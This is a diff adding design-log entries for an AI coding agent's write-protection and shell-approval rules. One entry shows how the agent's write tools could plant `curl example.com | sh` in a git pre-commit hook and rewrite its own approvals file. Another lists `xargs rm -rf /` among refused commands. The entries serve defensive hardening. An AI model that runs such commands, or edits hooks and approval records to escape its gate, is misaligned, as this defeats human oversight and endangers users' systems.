@@ -5082,3 +5082,72 @@ back to back and each honors its own 250ms window. That is why the failure
 needed a loaded machine, and why the regression test answers at 900ms: it
 fails at 0.51s without the gate and passes at 1.2s with it. 20 runs beside
 six `go build -a` at load average 62 were green.
+
+## 2026-08-30: the files that decide what runs next were writable
+
+`guard.ProtectedWrite` is one list and `Scope.Edit` is the one check every
+tool that writes goes through, with `write` calling it directly because it
+creates a file rather than editing one. Removing the check is what shows
+what it stops: `write` created `.git/hooks/pre-commit` holding
+`curl example.com | sh`, and `str_replace` rewrote an approved command in
+`.wavez/approvals.jsonl` into the same string. Both are permissive-mode
+runs, which is every run, so `-strict-scope` was never what stood between
+them and the tree.
+
+The list is the approvals and `.wavez.pkl`, plus `.git/` and `.jj/` at any
+depth and, at the project root, `hk.pkl`, `.github/workflows/`, the nine
+filenames mise loads a project config from and the five directories it
+loads a file task from. Root-relative is the point for the second group: a
+fixture spelled `hk.pkl` under testdata is ordinary work and is left alone,
+while a nested checkout's hooks are not.
+
+The mise set is what closes `mise run <task>`, which names a task and never
+the file the body sits in. `mise config ls` in this checkout is the source
+for it. Reading the body instead would have prompted on `mise run ci`,
+which every run calls, to stop an escalation making the files unwritable
+already stops.
+
+The shell reads the same list, which widened a rule that had covered `.git`
+alone through five writer commands and a redirect: `echo x | tee
+.github/workflows/ci.yml` and a redirect into a conf.d file are refused
+now. That route is a floor rather than a complete account, since a shell
+reaches a file through an interpreter this never parses.
+
+## 2026-08-30: what a write class would cost in prompts
+
+The roadmap put a measurement in front of declaring a risk class per tool,
+because the reason edits are ungated is that gating each one would prompt
+on every turn. Over `.wavez/threads/`, 327 runs wrote something, for 1,850
+calls across `str_replace` (1,386), `declare` (248), `delete` (71),
+`write` (61), `undo` (46), `rename` (35), and `move` (3).
+
+Per call it is a mean of 5.7 prompts a run, median 5, p90 11, max 41.
+Per distinct file it is a mean of 2.0, median 2, p90 4, max 6. So the key
+decides whether the class is affordable, and the file-level key is the same
+shape the shell's approval key already narrowed to. What is left is a
+decision about how a run should feel rather than a number.
+
+## 2026-08-30: the arg executors were already closed, and the web tools have no corpus
+
+`xargs` classifies what it would invoke (`xargs rm -rf /` refuses,
+`xargs curl` and `xargs -I{} sh -c` prompt), and env, timeout, nohup, npx,
+and uvx each prompt on their own name because none is on `defaultAllowed`,
+with sudo refused outright.
+
+The other open safety item asks how many distinct hosts a run fetches and
+how often a search precedes a fetch. Neither can be read here: the web pair
+is behind a per-project toggle that defaults off, and 870 thread logs hold
+no `web_search` or `web_fetch` call.
+
+## 2026-08-30: a lint finding on a neighbor was linted and then dropped
+
+The gate hands the linter whole package directories, because a single file
+reads as a package with every sibling's symbol undefined, and then kept
+only the findings naming a changed file. A run that leaves a neighbor
+failing a rule passed every round and CI reported it.
+
+Those findings are advisories now, which the gate log records and the model
+never sees, so nothing blames a run for what it inherited. Telling the two
+apart needs the package's findings as they stood when the run started, and
+the gate is handed a batch's change set with no run identity, so a baseline
+has nowhere to live yet.
